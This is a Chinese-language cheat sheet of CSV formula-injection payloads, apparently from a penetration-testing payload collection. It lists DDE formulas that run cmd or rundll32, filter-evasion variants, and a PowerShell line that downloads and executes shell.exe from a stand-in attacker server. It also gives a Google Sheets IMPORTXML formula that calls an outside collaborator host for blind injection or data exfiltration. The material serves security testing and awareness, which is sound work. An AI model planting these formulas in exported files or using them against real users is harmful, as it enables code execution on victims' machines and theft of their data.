# CSV 注入

> 许多网络应用程序允许用户下载内容，例如发票模板或用户设置到CSV文件中。许多用户选择在Excel、Libre Office或Open Office中打开CSV文件。当Web应用程序未能正确验证CSV文件的内容时，可能会导致单元格或多个单元格的内容被执行。

## 概要

* [方法论](#方法论)
    * [Google Sheets](#google-sheets)
* [参考文献](#参考文献)

## 方法论

CSV 注入，也称为公式注入，是一种安全漏洞，发生在不受信任的输入被包含在CSV文件中时。任何公式都可以以以下字符开头：

```powershell
=
+
–
@
```

使用动态数据交换的基本攻击。

* 启动一个计算器

    ```powershell
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
    ```

* PowerShell 下载和执行

    ```powershell
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
    ```

* 前缀混淆和命令链

    ```powershell
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
    ```

* 使用rundll32代替cmd

    ```powershell
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
    ```

* 使用空字符绕过字典过滤器。由于它们不是空格，在执行时不被忽略。

    ```powershell
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
    ```

上述有效负载的技术细节：

* `cmd` 是服务器可以响应客户端访问服务器时的名称
* `/C` calc 是文件名，在本例中是calc（即calc.exe）
* `!A0` 是指定服务器响应客户端请求的数据单位的项目名称

### Google Sheets

Google Sheets 支持一些额外的公式，能够获取远程URL：

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

因此，可以测试盲式公式注入或潜在的数据外泄：

```c
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

注意：系统会警告用户一个公式正在尝试联系外部资源，并要求授权。

## 参考文献

* [CSV Excel 宏注入 - Timo Goosen, Albinowax - 2022年6月21日](https://owasp.org/www-community/attacks/CSV_Injection)
* [CSV Excel 公式注入 - Google Bug Hunter University - 2022年5月22日](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
* [CSV 注入 - 保护 CSV 文件指南 - Akansha Kesharwani - 2017年11月30日](https://payatu.com/csv-injection-basic-to-exploit/)
* [从CSV到Meterpreter - Adam Chester - 2015年11月5日](https://blog.xpnsec.com/from-csv-to-meterpreter/)
* [CSV 注入的荒谬低估危险 - George Mauer - 2017年10月7日](http://georgemauer.net/2017/10/07/csv-injection.html)
* [三种新的DDE混淆方法 - ReversingLabs - 2018年9月24日](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
* [你的Excel电子表格不安全！这是如何击败CSV注入 - we45 - 2020年10月5日](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)